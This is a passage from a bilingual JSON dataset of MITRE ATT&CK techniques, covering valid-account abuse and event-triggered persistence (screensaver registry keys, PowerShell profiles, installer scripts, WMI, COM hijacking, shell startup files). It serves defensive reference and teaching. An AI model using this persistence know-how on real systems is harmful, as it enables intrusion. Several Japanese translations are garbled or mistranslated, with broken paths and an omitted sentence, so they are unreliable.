Token](https://attack.mitre.org/techniques/T1528) を使用してクラウド環境を横方向に移動できるようになる可能性があります。（引用：SpecterOps Managed Identity 2022）"
                    },
                    {
                        "id": "T1078.002",
                        "name_eng": "Domain Accounts",
                        "name_jp": "ドメインアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
                        "description_jp": "ドメインアカウントは、Active Directory ドメインサービスによって管理され、そのドメインの一部であるシス テムやサービス全体にわたってアクセスや権限が設定される(引用：Microsoft AD Accounts)。ドメインアカウントには、ユーザー、管理者、サービスが含まれる。\n\n攻撃者は、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)やパスワードの再利用など、さまざまな手段でドメインアカウント(一部は高水準の特権を持つ)を侵害し、ドメインの特権リソースへのアクセスを許可する可能性がある。"
                    },
                    {
                        "id": "T1078.003",
                        "name_eng": "Local Accounts",
                        "name_jp": "ローカルアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                        "description_jp": "攻撃者は、初期アクセス、永続性、特権のエスカレーション、または防御の回避を得る手段として、ロー カルアカウントの認証情報を入手し、悪用する可能性がある。ローカル・アカウントは、ユーザ、リモート・サポート、サービス、または単一のシステムまたはサービス上の管 理用に組織によって構成されたものである。\n\nローカルアカウントは、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)によって特権を昇格させ、資格情報を採取するために悪用される可能性もあります。パスワードの再利用は、特権の昇格と横移動の目的で、ネットワーク上の一連のマシンにまたがるローカルアカウントの悪用を許すかもしれない。"
                    },
                    {
                        "id": "T1078.001",
                        "name_eng": "Default Accounts",
                        "name_jp": "デフォルト口座",
                        "description_eng": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",
                        "description_jp": "攻撃者は、初期アクセス、永続性、特権の昇格、または防御回避を獲得する手段として、デフォルト・ アカウントの認証情報を入手し、悪用する可能性がある。デフォルトアカウントとは、Windows システムの Guest や Administrator アカウントなど、OS に組み込まれたアカウントのことである。デフォルトアカウントには、AWSのルートユーザーアカウント、ESXiのルートユーザーアカウント、Kubernetesのデフォルトのサービスアカウントなど、他の種類のシステム、ソフトウェア、デバイスのデフォルトのファクトリー/プロバイダセットアカウントも含まれる。 引用：Microsoft Local Accounts Feb 2019）（引用：AWS Root User）（引用：Threat Matrix for Kubernetes\n\nデフォルトアカウントはクライアントマシンに限らず、社内、オープンソース、商用を問わず、ネットワーク機器やコンピュータアプリケーションなどの機器にプリセットされているアカウントも含まれる。ユーザー名とパスワードの組み合わせがあらかじめ設定されているアプライアンスは、インストール後に変更しない組織にとって、敵対者にとって格好の標的となるため、深刻な脅威となる。同様に、敵は一般に公開された、あるいは盗まれた[秘密鍵](https://attack.mitre.org/techniques/T1552/004)やクレデンシャルを利用して、[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモート環境に合法的に接続することもできます。(引用：Metasploit SSH Module)\n\nデフォルトアカウントは、初期セットアップ後に他のアプリケーションと接続したり統合したりすることで、システム上に 作成される可能性があります。例えば、ESXi サーバが vCenter サーバに接続されると、ESXi サーバ上に `vpxuser` というデフォルトの特権アカウントが作成されます。例えば、vCenterホスト上で[Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)を使用するなどして、このアカウントの認証情報を侵害することができれば、ESXiサーバにアクセスできるようになります。(引用：Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用：Pentera vCenter Information Disclosure)"
                    }
                ]
            },
            {
                "id": "T1546",
                "name_eng": "Event Triggered Execution",
                "name_jp": "イベントトリガー実行",
                "description_eng": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
                "description_jp": "攻撃者は、特定のイベントに基づいて実行をトリガーするシステムメカニズムを使って、永続性を確立したり、特権を昇格させたりする可能性があります。様々なオペレーティングシステムは、ログオンなどのイベントや、特定のアプリケーション/バイナリの実行などのユーザーアクティビティを監視し、サブスクライブする手段を備えている。クラウド環境はまた、特定のクラウドイベントを監視し、それに応じて呼び出すことができる様々な機能やサービスをサポートしている場合があります。 引用：AWSアカウントのバックドア）（引用：Varonis Power Automate Data Exfiltration）（引用：Microsoft DART Case Report 001\n\n攻撃者は、悪意のあるコードを繰り返し実行することで、被害者への持続的なアクセスを維持する手段として、これらのメカニズムを悪用する可能性があります。被害者システムへのアクセスを獲得した後、敵対者はイベントトリガーを作成/変更し、イベントトリガーが呼び出されるたびに実行される悪意のあるコンテンツを指すようにする可能性があります(引用: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\n実行は、SYSTEMやサービスアカウントなど、より高い権限を持つアカウントによってプロキシされる可能性があるため、敵対者はこれらのトリガー実行メカニズムを悪用して特権をエスカレートできる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1546.002",
                        "name_eng": "Screensaver",
                        "name_jp": "スクリーンセーバー",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",
                        "description_jp": "攻撃者は、ユーザーの非アクティブをトリガーに悪意のあるコンテンツを実行することで、永続性を確立する可能性があります。スクリーンセーバーは、設定可能な無操作時間の後に実行されるプログラムであり、.scr ファイル拡張子を持つ Portable Executable (PE) ファイルで構成される。(引用: Wikipedia スクリーンセーバー) Windows スクリーンセーバーアプリケーション scrnsave.scr は、基本 Windows インストールに含まれるスクリーンセーバーと共に、<code>C:¥WindowsSystem32</code>、64 ビット Windows システムでは <code>C:¥WindowssysWOW64</code> に配置される。\n\n以下のスクリーンセーバー設定はレジストリ（<code>HKCU</code>Control Panel</code>Desktop</code>）に保存されており、永続化を実現するために操作される可能性があります：\n\n<code>SCRNSAVE.exe<//code> - 悪意のあるPEパスに設定されます。\n<code>ScreenSaveActive</code> - スクリーンセーバーを有効にするために「1」に設定されます。\n<code>ScreenSaverIsSecure</code> - ロック解除にパスワードを必要としないように '0' に設定します。\n<code>ScreenSaveTimeout</code> - スクリーンセーバーが実行される前に、ユーザの非アクティブ時のタイムアウトを設定します。\n\n攻撃者は、スクリーンセーバーの設定を利用して、ユーザーが一定時間操作を行わなかった後にマルウェアを実行するように設定することで、永続性を維持することができます(引用：ESET Gazer 2017年8月号)"
                    },
                    {
                        "id": "T1546.013",
                        "name_eng": "PowerShell Profile",
                        "name_jp": "PowerShellプロファイル",
                        "description_eng": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
                        "description_jp": "攻撃者は、PowerShell プロファイルをトリガーとして悪意のあるコンテンツを実行することで、永続性を獲得し、特権を昇格させる可能性があります。PowerShellプロファイル（<code>profile.ps1</code>）は、[PowerShell](https://attack.mitre.org/techniques/T1059/001)の起動時に実行されるスクリプトで、ユーザー環境をカスタマイズするためのログオンスクリプトとして使用できます。\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001)は、ユーザーやホストプログラムに応じた複数のプロファイルをサポートしています。たとえば、PowerShell コンソール、PowerShell ISE、Visual Studio Code など、[PowerShell](https://attack.mitre.org/techniques/T1059/001) ホスト・プログラムごとに異なるプロファイルを設定できます。管理者は、ローカル コンピュータ上のすべてのユーザーとホスト プログラムに適用されるプロファイルを構成することもできます。(引用: Microsoft プロファイルについて)\n\n攻撃者はこれらのプロファイルを変更し、任意のコマンド、関数、モジュール、および/または[PowerShell](https://attack.mitre.org/techniques/T1059/001)ドライブを含めることで、永続性を得ることができます。ユーザーが [PowerShell](https://attack.mitre.org/techniques/T1059/001) セッションを開くたびに、起動時に <code>-NoProfile</code> フラグが使用されていない限り、変更されたスクリプトが実行されます。(引用: ESET Turla PowerShell 2019年5月号)\n\nまた、PowerShellプロファイル内のスクリプトがロードされ、ドメイン管理者などのより高い権限を持つアカウントによって実行された場合、敵対者は権限をエスカレートできる可能性があります。(引用: Wits End and Shady PowerShell Profiles)"
                    },
                    {
                        "id": "T1546.016",
                        "name_eng": "Installer Packages",
                        "name_jp": "インストーラ・パッケージ",
                        "description_eng": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)",
                        "description_jp": "攻撃者は、インストーラを使用して悪意のあるコンテンツを実行させることで、永続性を確立し、特権を昇格させる可能性があります。インストーラパッケージはOS固有のものであり、オペレーティングシステムがシステムにアプリケーションをインストールするために必要なリソースを含んでいます。インストーラパッケージには、インストール前に実行されるスクリプトと、インストール完了後に実行されるスクリプトが含まれることがあります。インストーラスクリプトは、実行時に昇格権限を継承する場合があります。開発者は多くの場合、これらのスクリプトを使用して、インストール環境の準備、要件の確認、依存関係のダウンロード、インストール後のファイルの削除を行います。 (引用: インストーラパッケージスクリプティング Rich Trouton)\n\n敵対者は、正規のアプリケーションを使用して、悪意のあるコンテンツを実行するようにインストーラスクリプトを変更したアプリケーションを配布しています。ユーザがアプリケーションをインストールする際、インストールを許可するために管理者権限を付与する必要がある場合があります。正規のアプリケーションのインストールプロセスの最後に、macOS の `postinstall` スクリプトなどのコンテンツが、継承された昇格権限で実行される可能性があります。攻撃者はこれらのスクリプトを使用して、悪意のある実行ファイルを実行したり、昇格した権限で他の悪意のあるコンポーネント（[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)など）をインストールしたりすることができます。（引用：Application Bundle Manipulation Brandon Dalton）（引用：wardle evilquest parti）（引用：Windows AppleJeus GReAT）（引用：Debian Manual Maintainer Scripts）\n\nディストリビューションによっては、Linux版のパッケージインストーラスクリプトは、メンテナースクリプトやポストインストールスクリプトと呼ばれることもあります。これらのスクリプトには `preinst`、`postinst`、`prerm`、`postrm` スクリプトが含まれ、実行時には root として実行されます。\n\nWindows の場合、Microsoft Installer サービスはアプリケーションのインストー ル、アップデート、アンインストールを管理するために `.msi` ファイルを使用します。これらのインストールルーチンには、敵対者に悪用される可能性のある追加アクションを実行する指示が含まれていることもあります。(引用: Microsoft Installation Procedures)"
                    },
                    {
                        "id": "T1546.003",
                        "name_eng": "Windows Management Instrumentation Event Subscription",
                        "name_jp": "Windows Management Instrumentation イベントサブスクリプション",
                        "description_eng": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
                        "description_jp": "攻撃者は、Windows Management Instrumentation (WMI)イベントサブスクリプションによってトリガーされる悪意のあるコンテンツを実行することで、永続性を確立し、特権を昇格させる可能性があります。WMIは、定義されたイベントが発生したときにコードを実行するイベントフィルター、プロバイダー、コンシューマー、バインディングをインストールするために使用することができる。サブスクライブされるイベントの例としては、壁掛け時計の時刻、ユーザーログイン、コンピュータの稼働時間などが挙げられます（引用：Mandiant M-Trends 2015）。\n\n攻撃者は、WMIの機能を使用してイベントをサブスクライブし、そのイベントが発生したときに任意のコードを実行し、システム上に永続性を提供する可能性があります(引用: FireEye WMI SANS 2015)(引用: FireEye WMI 2015) また、攻撃者は、`mofcomp.exe`を使用して、悪意のあるサブスクリプションを作成するために使用できるWindows Management Object (MOF) ファイル(.mof 拡張子)にWMIスクリプトをコンパイルする可能性があります(引用: Dell WMI Persistence)(引用: Microsoft MOF May 2018)\n\nWMI サブスクリプションの実行は、WMI Provider Host プロセス (WmiPrvSe.exe) によってプロキシされるため、SYSTEM 権限が昇格する可能性があります。"
                    },
                    {
                        "id": "T1546.006",
                        "name_eng": "LC_LOAD_DYLIB Addition",
                        "name_jp": "LC_LOAD_DYLIB 追加",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",
                        "description_jp": "攻撃者は、汚染されたバイナリの実行をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立する可能性がある。Mach-Oバイナリは、バイナリがロードされたときに特定の操作を実行するために使用される一連のヘッダを持っています。Mach-OバイナリのLC_LOAD_DYLIBヘッダは、実行時にどのダイナミックライブラリ(dylibs)をロードするかをmacOSとOS Xに伝えます。これらは、残りのフィールドと依存関係を調整する限り、コンパイルされたバイナリにアドホックに追加することができます（引用：Writing Bad Malware for OSX）これらの変更を実行するために利用可能なツールがあります。\n\n攻撃者は、バイナリが実行されるたびに悪意のあるdylibをロードして実行するように、Mach-Oバイナリのヘッダを変更することができます。バイナリが変更されているため、いかなる変更もバイナリのデジタル署名を無効にしますが、バイナリからLC_CODE_SIGNATUREコマンドを削除するだけで、ロード時に署名がチェックされないようにすることができます。"
                    },
                    {
                        "id": "T1546.011",
                        "name_eng": "Application Shimming",
                        "name_jp": "アプリケーション・シミング",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
                        "description_jp": "攻撃者は、アプリケーションシムによって引き起こされる悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。Microsoft Windows Application Compatibility Infrastructure/Framework（アプリケーションシム）は、オペレーティングシステムのコードベースが時とともに変化する中で、ソフトウェアの後方互換性を可能にするために作成されました。例えば、アプリケーションシム機能により、開発者はWindows XP用に作成されたアプリケーションに（コードを書き換えることなく）修正を適用し、Windows 10でも動作するようにすることができる。(引用：Elastic Process Injection 2017年7月号）\n\nフレームワーク内では、プログラム（より具体的にはインポート・アドレス・テーブル）とWindows OSの間でバッファとして機能するシムが作成される。プログラムが実行されると、シムキャッシュが参照され、そのプログラムがシムデータベース（.sdb）の使用を必要とするかどうかが判断される。もしそうであれば、シムデータベースはOSと通信するために、必要に応じてコードをリダイレクトするフッキングを使用する。\n\nデフォルトのWindowsインストーラー（sdbinst.exe）によって現在インストールされているすべてのシムのリストが保持されている：\n\n<code>%WINDIR%AppPatch\\sysmain.sdb</code> および\n* に保存される。\n\nカスタム・データベースは\n\n* カスタム・データベースは以下の場所に格納されます。\n<code>hklmsoftware\n\nシムの安全性を保つため、Windows はシムをユーザーモードで実行するように設計しているため、シムはカーネルを変更できず、シムをインストールするには管理者権限が必要です。しかし、特定のシムは[Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)(UACとRedirectEXE)、プロセスへのDLLの注入(InjectDLL)、データ実行防止(DisableNX)と構造体例外処理(DisableSEH)の無効化、メモリアドレスの傍受(GetProcAddress)に使用できます。\n\nこれらのシムを利用することで、敵は特権の昇格、バックドアのインストール、Windows Defenderのような防御機能の無効化など、いくつかの悪意のある行為を実行できる可能性がある（引用：FireEye Application Shimming）。シムはまた、影響を受けるプログラムから継続的に呼び出されることで、永続性を確立するために悪用される可能性もある。"
                    },
                    {
                        "id": "T1546.015",
                        "name_eng": "Component Object Model Hijacking",
                        "name_jp": "コンポーネント・オブジェクト・モデルのハイジャック",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
                        "description_jp": "攻撃者は、Component Object Model（COM）オブジェクトへのハイジャックされた参照をトリガーに悪意のあるコンテンツを実行することで、永続性を確立する可能性がある。COM は、オペレーティング・システムを通じてソフトウェア・コンポーネント間の相互作用を可能にする Windows 内のシステムである（引用：Microsoft Component Object Model） 様々な COM オブジェクトへの参照は、レジストリに格納される。\n\n攻撃者は COM システムを利用し、永続化の手段として COM の参照とリレーションシップをハイジャックすることで、正当なソフトウェアの代わりに実行可能な悪意のあるコードを挿入することができます。COM オブジェクトをハイジャックするには、レジストリを変更し、正規のシステム・コンポーネントへの参照を置き換える必要があります。引用：GDATA COM ハイジャック）敵対者は、一貫したレベルの永続性を維持するのに十分な頻度で使用されるオブジェクトをハイジャックする可能性が高いが、検知につながる可能性のあるシステムの不安定性を回避するため、システム内の顕著な機能を破壊する可能性は低い。"
                    },
                    {
                        "id": "T1546.004",
                        "name_eng": "Unix Shell Configuration Modification",
                        "name_jp": "Unixシェル設定の変更",
                        "description_eng": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                        "description_jp": "攻撃者は、ユーザのシェルによって引き起こされる悪意のあるコマンドを実行することで、永続性を確立することができる。ユーザーの[Unix Shell](https://attack.mitre.org/techniques/T1059/004)は、イベントに基づいてセッション中の異なる時点でいくつかの設定スクリプトを実行します。例えば、ユーザがコマンドラインインターフェースを開いたり、(SSH経由などで)リモートログインすると、ログインシェルが起動します。ログインシェルはシステム (<code>/etc</code>) とユーザーのホームディレクトリ (<code>~/</code>) からスクリプトを実行して環境を設定します。システム上のすべてのログインシェルは、起動時に /etc/profile を使用します。これらの設定スクリプトは、そのディレクトリの権限レベルで実行され、環境変数の設定、エイリアスの作成、ユーザー環境のカスタマイズによく使われます。シェルが終了または終了すると、シェルが適切に終了するように、追加のシェルスクリプトが実行されます。\n\n攻撃者は、シェルによって自動的に実行されるスクリプトにコマンドを挿入することで、永続性を確立しようとする場合がある。ほとんどのGNU/Linuxシステムのデフォルトシェルであるbashを例にとると、敵対者は悪意のあるバイナリを起動するコマンドを<code>/etc/profile</code>ファイルと<code>/etc/profile.d</code>ファイルに追加する可能性があります。(引用：intezer-kaiji-malware)(引用：bencane blog bashrc) これらのファイルは通常、変更するためにrootパーミッションを必要とし、システム上のシェルが起動するたびに実行されます。ユーザーレベルのパーミッションの場合、敵対者は悪意のあるコマンドを <code>~/.bash_profile</code>、<code>~/.bash_login</code>、<code>~/.profile</code> に挿入することができます。(引用: anomali-rocke-tactics)(Citation: Linux manual bash invocation) システムはリストされた順序で最初に存在するファイルのみを実行するので、敵対者は実行を確実にするために<code>~/.bash_profile</code>を使用してきました。敵はまた、リモートで接続が確立されたり、コマンドラインインターフェイスの新しいタブなど、追加の対話型シェルが開かれた場合に追加で実行される<code>~/.bashrc</code>ファイルも活用しています。(引用：Tsunami)(引用：anomali-rocke-tactics)(引用：anomali-linux-rabbit)(引用：Magento) 実行をトリガーするためにプログラムの終了をターゲットにするマルウェアもあり、敵対者は <code>~/.bash_logout</code> ファイルを使用して、セッションの終了時に悪意のあるコマンドを実行することができます。\n\nmacOSの場合、このテクニックの機能は似ていますが、macOS 10.15+のデフォルトシェルであるzshを活用する可能性があります。Terminal.appを開くと、アプリケーションはzshログインシェルとzsh対話シェルを起動します。ログインシェルは、<code>/etc/profile</code>、<code>/etc/zshenv</code>、<code>/etc/zprofile</code>、<code>/etc/zlogin</code>を使用してシステム環境を設定します。(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) ログインシェルは、<code>~/.zprofile</code>と<code>~/.zlogin</code>でユーザー環境を設定します。対話型シェルは <code>~/.zshrc</code> を使ってユーザー環境を設定します。終了時には、<code>/etc/zlogout</code>と<code>~/.zlogout</code>が実行されます。レガシープログラムでは、macOSは起動時に<code>/etc/bashrc</code>を実行する。"
                    },
                    {
                        "id": "T1546.010",
                        "name_eng": "AppInit DLLs",
                        "name_jp": "AppInit DLLs",
